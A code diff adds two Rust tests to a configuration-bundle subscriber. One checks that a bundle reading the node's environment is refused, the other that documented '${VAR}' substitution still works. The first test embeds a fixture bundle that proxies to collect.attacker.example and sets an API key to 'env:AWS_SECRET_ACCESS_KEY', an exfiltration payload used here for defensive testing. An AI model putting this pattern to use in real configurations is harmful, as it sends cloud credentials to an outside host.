@@ -602,6 +602,74 @@ async fn a_bundle_that_does_not_compile_is_refused_and_the_previous_pipeline_kee
 }
 
 #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn a_bundle_reading_this_nodes_environment_is_refused() {
+    // WOR-2433. The deny list screens the PATHS a subscriber owns and
+    // cannot screen a VALUE. `origins` is not denied, so a bundle may
+    // legitimately set an origin's credential; it may not set it to a
+    // reference that reads THIS node's process environment and ships the
+    // result wherever the bundle's action points. `env:` carries no
+    // template syntax, so the unresolved-`${VAR}` gate never sees it and
+    // the substitution it performs always succeeds.
+    let _serial = SERIAL.lock().await;
+    let temp = tempfile::tempdir().expect("temp dir");
+    let dir = temp.path();
+    let (mut subscriber, stub) =
+        applied_baseline(dir, "envref-local.test", "envref-authority.test").await;
+    let identity_before = pipeline_identity();
+    let denied_before = fetch_total("denied_path");
+
+    stub.serve(
+        sign(
+            6,
+            BundleMode::Overlay,
+            r#"
+origins:
+  "exfil.test":
+    action:
+      type: proxy
+      url: https://collect.attacker.example
+    authentication:
+      type: api_key
+      api_key: "env:AWS_SECRET_ACCESS_KEY"
+"#,
+        )
+        .to_json()
+        .expect("encode"),
+    );
+
+    assert_eq!(subscriber.poll_once().await, CycleResult::DeniedPath);
+    assert_eq!(fetch_total("denied_path"), denied_before + 1);
+    assert_eq!(pipeline_identity(), identity_before, "no reload may happen");
+    assert!(serves("envref-authority.test"), "revision 5 keeps serving");
+    assert_eq!(subscriber.revision(), 5, "the cursor must not move");
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn a_bundle_naming_a_per_node_variable_still_applies() {
+    // The other half of the same boundary: `${VAR}` is the documented
+    // way a fleet-wide document names per-node values, so confinement
+    // must not have taken it away.
+    let _serial = SERIAL.lock().await;
+    let temp = tempfile::tempdir().expect("temp dir");
+    let dir = temp.path();
+    let (mut subscriber, stub) =
+        applied_baseline(dir, "envok-local.test", "envok-authority.test").await;
+
+    stub.serve(
+        sign(
+            6,
+            BundleMode::Overlay,
+            &bundle_payload("envok-authority.test", "${PATH:-fallback-body}"),
+        )
+        .to_json()
+        .expect("encode"),
+    );
+
+    assert_eq!(subscriber.poll_once().await, CycleResult::Applied);
+    assert_eq!(subscriber.revision(), 6);
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 async fn a_bundle_claiming_a_subscriber_owned_path_is_refused() {
     let _serial = SERIAL.lock().await;
     let temp = tempfile::tempdir().expect("temp dir");
